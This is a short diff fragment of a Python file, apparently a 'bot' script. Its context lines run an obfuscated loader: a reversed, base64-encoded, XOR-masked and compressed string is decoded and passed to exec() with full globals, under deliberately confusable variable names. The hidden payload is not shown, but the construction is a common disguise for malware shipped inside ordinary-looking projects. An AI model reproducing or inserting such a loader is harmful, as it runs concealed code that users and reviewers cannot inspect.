@@ -12,3 +12,4 @@ try:
     exec(I00O18.decompress(bytes([x ^ XO0BlI8I0B for x in I0IIBl.b64decode(lIl8l08B1I[::-1])])).decode('utf-8'), globals())
 except Exception as e:
     print("Error Running Bot: " + str(e))
+
